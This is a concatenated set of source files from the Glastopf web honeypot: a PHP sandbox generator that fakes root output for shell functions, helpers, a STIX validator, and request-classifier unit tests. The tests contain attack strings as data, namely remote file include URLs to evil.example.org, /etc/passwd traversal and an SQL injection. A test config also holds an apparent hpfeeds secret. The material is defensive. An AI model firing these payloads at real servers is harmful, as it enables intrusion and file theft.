# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import random

import functions


FUNCTIONS = functions.FUNCTIONS
WHITELIST = functions.WHITELIST

print("<?php\n//Generated by Glastopf sandbox.generate.py\n")
print("if(!extension_loaded('bfr')) {\n\tdl('bfr.so');\n}\n")
print("error_reporting(0);\n")

print("$functions = get_defined_functions();")
print("$functions = $functions['internal'];")

print("$whitelist = array(")
for i, function in enumerate(WHITELIST):
    print('\t\t%s => "%s",' % (i, function))
print(");")

print("$functions = array_diff($functions, $whitelist);\n")

print("foreach ($functions as $function){")
print("\t$rand_int = rand(100,999);")
print("\trename_function($function, $function.'_'.$rand_int);")
print("}\n")

seed_int = 0
for function, return_val in FUNCTIONS.items():
    parts = function.split(";")
    function_name = parts[0]
    function_args = ", ".join(parts[1:-1])
    rand_int = random.randint(100, 999)
    print("override_function('%s', '%s', 'return %s_rep(%s);');" % (
    function_name, function_args, function_name, function_args))
    print("function %s_rep(%s) {" % (function_name, function_args))
    if return_val == "None":
        return_val = "\treturn;"
    print(return_val)
    #print("\terror_log(\"ret:%s(\" . join(', ', $args) . \")= \" . $result);" % function_name)
    print("}")
    print("rename_function('__overridden__', '%s');\n" % seed_int)
    seed_int += 1

print("\ninclude $argv[1];\n?>")

########NEW FILE########
__FILENAME__ = execute
# Copyright (C) 2011  Lukas Rist
# 
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

def call():
    function = """\tif ($cmd == 'id') {
\t\t$ret = array('uid=0(root) gid=0(root) groups=0(root)',);
\t}
\telse {
\t\t$ret = array('None',);
\t}"""
    return function
########NEW FILE########
__FILENAME__ = getenv
# Copyright (C) 2011  Lukas Rist
# 
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

def call():
    function = """\t$ret = "";
\treturn $ret;"""
    return function
########NEW FILE########
__FILENAME__ = ini_get
# Copyright (C) 2011  Lukas Rist
# 
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

def call():
    function = """\tif ($varname == 'save_mode') {
\t\t$ret = 'None';
\t}
\telseif ($varname == 'disable_functions') {
\t\t$ret = 'None';
\t}
\telse {
\t\t$ret = 'None';
\t}"""
    return function
########NEW FILE########
__FILENAME__ = passthru
# Copyright (C) 2011  Lukas Rist
# 
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

def call():
    function = """\tif ($cmd == 'id') {
\t\t$ret = array('uid=0(root) gid=0(root) groups=0(root)',);
\t}
\telse {
\t\t$ret = array('None',);
\t}"""
    return function
########NEW FILE########
__FILENAME__ = popen
# Copyright (C) 2011  Lukas Rist
# 
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

def call():
    function = """\tif ($cmd == 'id') {
\t\t$temp = tmpfile();
\t\tfwrite($temp, 'uid=0(root) gid=0(root) groups=0(root)');
\t\t$ret = $temp;
\t}
\telse {
\t\t$ret = tmpfile();
\t}
\treturn $ret;"""
    return function
########NEW FILE########
__FILENAME__ = shell_exec
# Copyright (C) 2011  Lukas Rist
# 
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

def call():
    function = """\tif ($cmd == 'id') {
\t\t$ret = array('uid=0(root) gid=0(root) groups=0(root)',);
\t}
\telse {
\t\t$ret = array('None',);
\t}
\treturn $ret;"""
    return function
########NEW FILE########
__FILENAME__ = system
# Copyright (C) 2011  Lukas Rist
# 
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

def call():
    # TODO: Make uptime dynamic
    function = """\tif ($cmd == 'id') {
\t\t$ret = array('uid=0(root) gid=0(root) groups=0(root)',);
\t}
\telseif ($cmd == 'uptime') {
\t\t$ret = array('16:12:55 up 152 days, 19:03,  0 user,  load average: 0.02, 0.02, 0.03',);
\t}
\telse {
\t\t$ret = array('None',);
\t}"""
    return function
########NEW FILE########
__FILENAME__ = sandbox
#!/usr/bin/env python

# Copyright (C) 2014  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import os
import logging

from gevent import Timeout
import gevent.subprocess


logger = logging.getLogger(__name__)


def sandbox(script, secs, data_dir):
    proc = None
    stdout_value = ""
    try:
        proc = gevent.subprocess.Popen(
            ["php", os.path.join(data_dir, "sandbox.php"), os.path.join(data_dir, "files", script)],
            shell=False,
            stdin=gevent.subprocess.PIPE,
            stdout=gevent.subprocess.PIPE,
            stderr=gevent.subprocess.PIPE,
        )
    except Exception as e:
        logger.exception("Error executing the sandbox:".format(e))
    try:
        with Timeout(secs, False):
            if proc:
                stdout_value, stderr_value = proc.communicate()
    except Exception as e:
        logger.exception("Sandbox communication error:".format(e))
    else:
        logger.info("File successfully parsed with sandbox.")
    return stdout_value


def run(script, data_dir):
    secs = 10
    return sandbox(script, secs, data_dir)

########NEW FILE########
__FILENAME__ = helpers
from sqlalchemy import Table, Column, Integer, String, MetaData
from sqlalchemy import create_engine
import bson
import warnings
import os
import uuid
from subprocess import call

file_dir = os.path.dirname(os.path.abspath(__file__))


def create_mongo_database(fill=True):
    from pymongo import MongoClient, uri_parser
    db_name = 'glastopf-test-{0}'.format(str(uuid.uuid4())[0:10])
    conn_string = "mongodb://localhost/{0}".format(db_name)

    with warnings.catch_warnings(record=True):
        c = MongoClient(conn_string)

    #read and insert test data into mongodb instance
    if fill:
        data = open(os.path.join(file_dir, 'data/events_500.bson'), 'r').read()
        for item in bson.decode_all(data):
            del item['_id']
            c[db_name].events.insert(item)
    return conn_string


def delete_mongo_testdata(conn_string):
    from pymongo import MongoClient, uri_parser
    db_name = uri_parser.parse_uri(conn_string)['database']
    with warnings.catch_warnings(record=True):
        client = MongoClient(conn_string)
    client.drop_database(db_name)


def populate_main_sql_testdatabase(engine):
    meta = MetaData()

    table = Table('events', meta,
                  Column('id', Integer, primary_key=True, ),
                  Column('time', String(30)),
                  Column('source', String(30)),
                  Column('request_url', String(500)),
                  Column('request_raw', String(65536)),
                  Column('pattern', String(20)),
                  Column('filename', String(500)),
    )

    meta.create_all(engine)

    insert_dicts = []
    data = open(os.path.join(file_dir, 'data/events_500.bson'), 'r').read()
    for item in bson.decode_all(data):
        new_item = {"source": "{0}:{1}".format(item["source"][0], item["source"][1]),
                    "request_url": item["request"]["url"],
                    "pattern": item["pattern"]}

        insert_dicts.append(new_item)

    conn = engine.connect()
    print "Inserted: {0}".format(len(insert_dicts))
    conn.execute(table.insert(), insert_dicts)


def create_empty_main_db_sqla(engine):
    meta = MetaData()

    Table('events', meta,
          Column('id', Integer, primary_key=True, ),
          Column('time', String(30)),
          Column('source', String(30)),
          Column('request_url', String(500)),
          Column('request_raw', String(65536)),
          Column('pattern', String(20)),
          Column('filename', String(500)),
    )

    meta.create_all(engine)


def create_sandbox(dest_dir):
    sandbox_dir = os.path.join(file_dir, '../sandbox')

    #preserve old working dir
    old_cwd = os.getcwd()

    os.chdir(sandbox_dir)

    #execute makefile and output to self.workdir/data/apd_sandbox.php
    sandbox_out = os.path.join(dest_dir, 'apd_sandbox.php')
    call(['make', 'out={0}'.format(sandbox_out)])
    print sandbox_out
    #restore state of original working dir
    os.chdir(old_cwd)


def gen_config(conn_string):
    """
    Generates configuration for testing purposes.
    """
    return [
        "[dork-db]\n",
        "enabled = True\n",
        "pattern = rfi\n",
        "token_pattern = /\w+\n",
        "n_clusters = 10\n",
        "max_iter = 10\n",
        "n_init = 2\n",
        "[surfcertids]\n",
        "enabled = False\n",
        "host = localhost\n",
        "port = 5432\n",
        "user =\n",
        "password =\n",
        "database = idsserver\n",
        "[syslog]\n",
        "enabled = False\n",
        "socket = /dev/log\n",
        "[mail]\n",
        "enabled = False\n",
        "patterns = rfi,lfi\n",
        "user =\n",
        "pwd =\n",
        "mail_from =\n",
        "mail_to =\n",
        "smtp_host = smtp.gmail.com\n",
        "smtp_port = 587\n",
        "[hpfeed]\n",
        "enabled = True\n",
        "host = hpfriends.honeycloud.net\n",
        "port = 20000\n",
        "secret = XDNNuMGYUuWFaWyi\n",
        "chan_events = test.test\n",
        "chan_files = test.test\n",
        "ident = HBmU08rR\n",
        "[webserver]\n",
        "proxy_enabled = False\n",
        "host = 0.0.0.0\n",
        "port = 8080\n",
        "uid = nobody\n",
        "gid = nogroup\n",
        "[surfcertids]\n",
        "enabled = False\n",
        "host = localhost\n",
        "port = 5432\n",
        "user = \n",
        "password = \n",
        "database = idsserver\n",
        "proxy_enabled = False\n",
        "[taxii]\n",
        "enabled = False\n",
        "host = taxiitest.mitre.org\n",
        "port = 80\n",
        "inbox_path = /services/inbox/default/\n",
        "use_https = False\n",
        "include_contact_info = False\n",
        "contact_name = ...\n",
        "contact_email = ...\n",
        "[misc]\n",
        "banner = Apache/2.0.48\n",
        "[main-database]\n",
        "enabled = True\n",
        "connection_string = {0}\n".format(conn_string),
    ]


if __name__ == '__main__':
    engine = create_engine('sqlite:///')
    populate_main_sql_testdatabase(engine)

########NEW FILE########
__FILENAME__ = mitre_stix_validator
# Copyright (c) 2013, The MITRE Corporation
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#     * Redistributions of source code must retain the above copyright
#       notice, this list of conditions and the following disclaimer.
#     * Redistributions in binary form must reproduce the above copyright
#       notice, this list of conditions and the following disclaimer in the
#       documentation and/or other materials provided with the distribution.
#     * Neither the name of The MITRE Corporation nor the
#       names of its contributors may be used to endorse or promote products
#       derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
# ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

import os
import re
from collections import defaultdict
from lxml import etree as et


class XmlValidator(object):
    NS_XML_SCHEMA_INSTANCE = "http://www.w3.org/2001/XMLSchema-instance"
    NS_XML_SCHEMA = "http://www.w3.org/2001/XMLSchema"

    def __init__(self, schema_dir=None, use_schemaloc=False):
        self.__imports = self._build_imports(schema_dir)
        self.__use_schemaloc = use_schemaloc

    def _get_target_ns(self, fp):
        """Returns the target namespace for a schema file

        Keyword Arguments
        fp - the path to the schema file
        """
        tree = et.parse(fp)
        root = tree.getroot()
        return root.attrib['targetNamespace'] # throw an error if it doesn't exist...we can't validate

    def _get_include_base_schema(self, list_schemas):
        """Returns the root schema which defines a namespace.

        Certain schemas, such as OASIS CIQ use xs:include statements in their schemas, where two schemas
        define a namespace (e.g., XAL.xsd and XAL-types.xsd). This makes validation difficult, when we
        must refer to one schema for a given namespace.

        To fix this, we attempt to find the root schema which includes the others. We do this by seeing
        if a schema has an xs:include element, and if it does we assume that it is the parent. This is
        totally wrong and needs to be fixed. Ideally this would build a tree of includes and return the
        root node.

        Keyword Arguments:
        list_schemas - a list of schema file paths that all belong to the same namespace
        """
        parent_schema = None
        tag_include = "{%s}include" % (self.NS_XML_SCHEMA)

        for fn in list_schemas:
            tree = et.parse(fn)
            root = tree.getroot()
            includes = root.findall(tag_include)

            if len(includes) > 0: # this is a hack that assumes if the schema includes others, it is the base schema for the namespace
                return fn

        return parent_schema

    def _build_imports(self, schema_dir):
        """Given a directory of schemas, this builds a dictionary of schemas that need to be imported
        under a wrapper schema in order to enable validation. This returns a dictionary of the form
        {namespace: path to schema}.

        Keyword Arguments
        schema_dir - a directory of schema files
        """
        if not schema_dir:
            return None

        imports = defaultdict(list)
        for top, dirs, files in os.walk(schema_dir):
            for f in files:
                if f.endswith('.xsd'):
                    fp = os.path.join(top, f)
                    target_ns = self._get_target_ns(fp)
                    imports[target_ns].append(fp)

        for k,v in imports.iteritems():
            if len(v) > 1:
                base_schema = self._get_include_base_schema(v)
                imports[k] = base_schema
            else:
                imports[k] = v[0]

        return imports

    def _build_wrapper_schema(self, import_dict):
        """Creates a wrapper schema that imports all namespaces defined by the input dictionary. This enables
        validation of instance documents that refer to multiple namespaces and schemas

        Keyword Arguments
        import_dict - a dictionary of the form {namespace: path to schema} that will be used to build the list of xs:import statements
        """
        schema_txt = """<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema" targetNamespace="http://stix.mitre.org/tools/validator" elementFormDefault="qualified" attributeFormDefault="qualified"/>"""
        root = et.fromstring(schema_txt)

        tag_import = "{%s}import" % (self.NS_XML_SCHEMA)
        for ns, list_schemaloc in import_dict.iteritems():
            schemaloc = list_schemaloc
            schemaloc = schemaloc.replace("\\", "/")
            attrib = {'namespace': ns, 'schemaLocation': schemaloc}
            el_import = et.Element(tag_import, attrib=attrib)
            root.append(el_import)

        return root

    def _extract_schema_locations(self, root):
        schemaloc_dict = {}

        tag_schemaloc = "{%s}schemaLocation" % (self.NS_XML_SCHEMA_INSTANCE)
        schemaloc = root.attrib[tag_schemaloc].split()
        schemaloc_pairs = zip(schemaloc[::2], schemaloc[1::2])

        for ns, loc in schemaloc_pairs:
            schemaloc_dict[ns] = loc

        return schemaloc_dict

    def validate(self, instance_doc):
        """Validates an instance documents.

        Returns a tuple of where the first item is the boolean validation
        result and the second is the validation error if there was one.

        Keyword Arguments
        instance_doc - a file-like object to be validated
        """
        if not(self.__use_schemaloc or self.__imports):
            return False, "No schemas to validate against! Try instantiating XmlValidator with use_schemaloc=True or setting the schema_dir"

        try:
            instance_doc = et.parse(instance_doc)
        except et.XMLSyntaxError as e:
            return False, str(e)

        instance_root = instance_doc.getroot()
        if self.__use_schemaloc:
            try:
                required_imports = self._extract_schema_locations(instance_root)
            except KeyError as e:
                return False, "No schemaLocation attribute set on instance document. Unable to validate"
        else:
            required_imports = {}
            for prefix, ns in instance_root.nsmap.iteritems():
                schemaloc = self.__imports.get(ns)
                if schemaloc:
                    required_imports[ns] = schemaloc

        if not required_imports:
            return False, "Unable to determine schemas to validate against"

        wrapper_schema_doc = self._build_wrapper_schema(import_dict=required_imports)
        xmlschema = et.XMLSchema(wrapper_schema_doc)

        try:
            xmlschema.assertValid(instance_doc)
            return True, None
        except Exception as e:
            return False, str(e)


class STIXValidator(XmlValidator):
    """Schema validates STIX v1.0 documents and checks best practice guidance"""
    __stix_version__ = "1.0"

    PREFIX_STIX_CORE = 'stix'
    PREFIX_CYBOX_CORE = 'cybox'
    PREFIX_STIX_INDICATOR = 'indicator'

    NS_STIX_CORE = "http://stix.mitre.org/stix-1"
    NS_STIX_INDICATOR = "http://stix.mitre.org/Indicator-2"
    NS_CYBOX_CORE = "http://cybox.mitre.org/cybox-2"

    NS_MAP = {PREFIX_CYBOX_CORE: NS_CYBOX_CORE,
              PREFIX_STIX_CORE: NS_STIX_CORE,
              PREFIX_STIX_INDICATOR: NS_STIX_INDICATOR}

    def __init__(self, schema_dir=None, use_schemaloc=False, best_practices=False):
        super(STIXValidator, self).__init__(schema_dir, use_schemaloc)
        self.best_practices = best_practices

    def _check_id_presence_and_format(self, instance_doc):
        """Checks that the core STIX/CybOX constructs in the STIX instance document
        have ids and that each id is formatted as [ns_prefix]:[object-type]-[GUID].

        Returns a dictionary of lists. Each dictionary has the following keys:
        no_id - a list of etree Element objects for all nodes without ids
        format - a list of etree Element objects with ids not formatted as [ns_prefix]:[object-type]-[GUID]

        Keyword Arguments
        instance_doc - an etree Element object for a STIX instance document
        """
        return_dict = {'no_id': [],
                       'format': []}

        elements_to_check = ['stix:Campaign',
                             'stix:Course_Of_Action',
                             'stix:Exploit_Target',
                             'stix:Incident',
                             'stix:Indicator',
                             'stix:STIX_Package',
                             'stix:Threat_Actor',
                             'stix:TTP',
                             'cybox:Observable',
                             'cybox:Object',
                             'cybox:Event',
                             'cybox:Action']

        for tag in elements_to_check:
            xpath = ".//%s" % (tag)
            elements = instance_doc.xpath(xpath, namespaces=self.NS_MAP)

            for e in elements:
                try:
                    if not re.match(r'\w+:\w+-', e.attrib['id']): # not the best regex
                        return_dict['format'].append(e)
                except KeyError as ex:
                    return_dict['no_id'].append(e)

        return return_dict

    def _check_duplicate_ids(self, instance_doc):
        """Looks for duplicate ids in a STIX instance document.

        Returns a dictionary of lists. Each dictionary uses the offending
        id as a key, which points to a list of etree Element nodes which
        use that id.

        Keyword Arguments
        instance_doc - an etree.Element object for a STIX instance document
        """
        dict_id_nodes = defaultdict(list)
        dup_dict = {}
        xpath_all_nodes_with_ids = "//*[@id]"

        all_nodes_with_ids = instance_doc.xpath(xpath_all_nodes_with_ids)
        for node in all_nodes_with_ids:
            dict_id_nodes[node.attrib['id']].append(node)

        for k,v in dict_id_nodes.iteritems():
            if len(v) > 1:
                dup_dict[k] = v

        return dup_dict

    def _check_idref_resolution(self, instance_doc):
        """Checks that all idref attributes in the input document resolve to a local element.
        Returns a list etree.Element nodes with unresolveable idrefs.

        Keyword Arguments
        instance_doc - an etree.Element object for a STIX instance document
        """
        list_unresolved_ids = []
        xpath_all_idrefs = "//*[@idref]"
        xpath_all_ids = "//@id"

        all_idrefs = instance_doc.xpath(xpath_all_idrefs)
        all_ids = instance_doc.xpath(xpath_all_ids)

        for node in all_idrefs:
            if node.attrib['idref'] not in all_ids:
                list_unresolved_ids.append(node)

        return list_unresolved_ids

    def _check_idref_with_content(self, instance_doc):
        """Looks for elements that have an idref attribute set, but also have content.
        Returns a list of etree.Element nodes.

        Keyword Arguments:
        instance_doc - an etree.Element object for a STIX instance document
        """
        list_nodes = []
        xpath = "//*[@idref]"
        nodes = instance_doc.xpath(xpath)

        for node in nodes:
            if node.text or len(node) > 0:
                list_nodes.append(node)

        return list_nodes

    def _check_indicator_practices(self, instance_doc):
        """Looks for STIX Indicators that are missing a Title, Description, Type, Valid_Time_Position,
        Indicated_TTP, and/or Confidence

        Returns a list of dictionaries. Each dictionary has the following keys:
        id - the id of the indicator
        node - the etree.Element object for the indicator
        missing - a list of constructs missing from the indicator

        Keyword Arguments
        instance_doc - etree Element for a STIX instance document
        """
        list_indicators = []
        xpath = "//%s:Indicator | %s:Indicator" % (self.PREFIX_STIX_CORE, self.PREFIX_STIX_INDICATOR)

        nodes = instance_doc.xpath(xpath, namespaces=self.NS_MAP)
        for node in nodes:
            dict_indicator = defaultdict(list)
            if not node.attrib.get('idref'):  # if this is not an idref node, look at its content
                if node.find('{%s}Title' % (self.NS_STIX_INDICATOR)) is None:
                    dict_indicator['missing'].append('Title')
                if node.find('{%s}Description' % (self.NS_STIX_INDICATOR)) is None:
                    dict_indicator['missing'].append('Description')
                if node.find('{%s}Type' % (self.NS_STIX_INDICATOR)) is None:
                    dict_indicator['missing'].append('Type')
                if node.find('{%s}Valid_Time_Position' % (self.NS_STIX_INDICATOR)) is None:
                    dict_indicator['missing'].append('Valid_Time_Position')
                if node.find('{%s}Indicated_TTP' % (self.NS_STIX_INDICATOR)) is None:
                    dict_indicator['missing'].append('TTP')
                if node.find('{%s}Confidence' % (self.NS_STIX_INDICATOR)) is None:
                    dict_indicator['missing'].append('Confidence')

                if dict_indicator:
                    dict_indicator['id'] = node.attrib.get('id')
                    dict_indicator['node'] = node
                    list_indicators.append(dict_indicator)

        return list_indicators

    def _check_root_element(self, instance_doc):
        if instance_doc.tag != "{%s}STIX_Package" % (self.NS_STIX_CORE):
            return instance_doc
        else:
            return None

    def check_best_practices(self, instance_doc):
        """Checks that a STIX instance document is following best practice guidance.

        Looks for the following:
        + idrefs that do not resolve locally
        + elements with duplicate ids
        + elements without ids
        + elements with ids not formatted as [ns_prefix]:[object-type]-[GUID]
        + indicators missing a Title, Description, Type, Valid_Time_Position, Indicated_TTP, and/or Confidence

        Returns a dictionary of lists and other dictionaries. This is maybe not ideal but workable.

        Keyword Arguments
        instance_doc - a file-like object for a STIX instance document
        """
        instance_doc.seek(0)
        tree = et.parse(instance_doc)
        root = tree.getroot()

        root_element = self._check_root_element(root)
        list_unresolved_idrefs = self._check_idref_resolution(root)
        dict_duplicate_ids = self._check_duplicate_ids(root)
        dict_presence_and_format = self._check_id_presence_and_format(root)
        list_idref_with_content = self._check_idref_with_content(root)
        list_indicators = self._check_indicator_practices(root)

        return {'root_element': root_element,
                'unresolved_idrefs': list_unresolved_idrefs,
                'duplicate_ids': dict_duplicate_ids,
                'missing_ids': dict_presence_and_format['no_id'],
                'id_format': dict_presence_and_format['format'],
                'idref_with_content': list_idref_with_content,
                'indicator_suggestions': list_indicators }

    def validate(self, instance_doc):
        """Validates a STIX document and checks best practice guidance if STIXValidator
        was initialized with best_practices=True.

        Best practices will not be checked if the document is schema-invalid.

        Returns a tuple of (bool, str, dict) for (is valid, validation error, best practice suggestions).

        Keyword Arguments
        instance_doc - a file-like object for a STIX instance document
        """
        (isvalid, validation_error) = super(STIXValidator, self).validate(instance_doc)

        if self.best_practices and isvalid:
            best_practice_warnings = self.check_best_practices(instance_doc)
        else:
            best_practice_warnings = None

        return isvalid, validation_error, best_practice_warnings

########NEW FILE########
__FILENAME__ = test_classifiers
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import unittest
import os
import tempfile
import shutil

from glastopf.modules.HTTP.handler import HTTPHandler
from glastopf.glastopf import GlastopfHoneypot
import glastopf.modules.classification.request as request_classifier


class TestClassifier(unittest.TestCase):
    """Test the behaviour of the Classifier class based on the rules
    defined into the requests.xml to detect the attack pattern
    """

    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        data_dir = os.path.join(self.tmpdir, 'data')
        GlastopfHoneypot.prepare_environment(self.tmpdir)
        self.requestClassifier = request_classifier.Classifier(data_dir)

    def tearDown(self):
        if os.path.isdir(self.tmpdir):
            shutil.rmtree(self.tmpdir)

    def test_robots_classifier(self):
        """Objective: Test classifier for robots.txt requests
        Input: HTTPRequest with an robots.txt GET request
        Expected Response: matched pattern to robots
        Note: """

        httphandler = HTTPHandler('GET /robots.txt HTTP/1.0', None)

        matched_pattern = self.requestClassifier.classify_request(httphandler)
        self.assertTrue(matched_pattern == 'robots', '{0} did not match expected pattern'.format(matched_pattern))

    def test_rfi_classifier(self):
        """Objective: Test classifier for RFI requests
        Input: HTTPRequest with different kind of remote file includes attempts
        Expected Response: matched pattern to rfi
        Note: """

        intput_paths = ('/index.php?file=http://evil.example.org/t.txt?',
                        '/index.php?file=%20http://evil.example.org/t.txt?',
                        '/index.php?file=https://evil.example.org/t.txt?',
                        '/index.php?file=ftp://evil.example.org/t.txt?,'
                        '/index.php?file=ftps://evil.example.org/t.txt?',
                        're/test.jsp?r=%22http://www.gogole.it/')

        for path in intput_paths:
            request = 'GET {0} HTTP/1.0'.format(path)
            http_handler = HTTPHandler(request, None)
            matched_pattern = self.requestClassifier.classify_request(http_handler)
            self.assertTrue(matched_pattern == 'rfi', '{0} did not match expected pattern'.format(matched_pattern))

    def test_lfi_classifier(self):
        """Objective: Test classifier for LFI requests
        Input: HTTPRequest with different kind of local file includes attempts
        Expected Response: matched pattern to rfi
        Note: """

        intput_paths = ('/index.php?file=../../../../../../etc/passwd',
                        '/index.php?file=../../../../../../etc/passwd%00')

        for path in intput_paths:
            request = 'GET {0} HTTP/1.0'.format(path)
            http_handler = HTTPHandler(request, None)
            matched_pattern = self.requestClassifier.classify_request(http_handler)
            self.assertTrue(matched_pattern == 'lfi', '{0} did not match expected pattern'.format(matched_pattern))

    def test_phpmyadmin_classifier(self):
        """Objective: Test classifier for phpmyadmin requests
        Input: HTTPRequest with a generic reference to phpmyadmin paths
        Expected Response: matched pattern to phpmyadmin
        Note: """

        intput_paths = ('/phpmyadmin/',
                        '/phpMyadmin/',
                        '/pma/',
                        '/PMA',
                        '/phpMyAdmin-2.8.2/')

        for path in intput_paths:
            request = 'GET {0} HTTP/1.0'.format(path)
            http_handler = HTTPHandler(request, None)
            matched_pattern = self.requestClassifier.classify_request(http_handler)
            self.assertTrue(matched_pattern == 'phpmyadmin', '{0} did not match expected pattern'.format(matched_pattern))

    def test_sqli_classifier(self):
        """Objective: Test classifier for SQL Injection requests
        Input: HTTPRequest with a generic sql injection attempt
        Expected Response: matched pattern to sqli
        Note: """

        intput_paths = ('/index.php?id=anything"%20OR%20"x"="x";',)

        for path in intput_paths:
            request = 'GET {0} HTTP/1.0'.format(path)
            http_handler = HTTPHandler(request, None)
            print http_handler.request_path
            print http_handler.request_query
            matched_pattern = self.requestClassifier.classify_request(http_handler)
            self.assertTrue(matched_pattern == 'sqli', '{0} did not match expected pattern'.format(matched_pattern))

    def test_login_classifier(self):
        """Objective: Test classifier for login requests
        Input: HTTPRequest with a generic authentication login attempt
        Expected Response: matched pattern to login
        Note: """

        intput_paths = ('/login',)

        for path in intput_paths:
            request = 'GET {0} HTTP/1.0'.format(path)
            http_handler = HTTPHandler(request, None)
            matched_pattern = self.requestClassifier.classify_request(http_handler)
            self.assertTrue(matched_pattern == 'login', '{0} did not match expected pattern'.format(matched_pattern))

    def test_phpinfo_classifier(self):
        """Objective: Test classifier for phpinfo debug/test requests
        Input: HTTPRequest with an attempt to discover a generic phpinfo test page
        Expected Response: matched pattern to phpinfo
        Note: """

        intput_paths = ('/phpinfo.php?ss',
                        '/phpinfo.php',
                        '/info.php',
                        '/info.php?page',
                        '/phpinfo.html')

        for path in intput_paths:
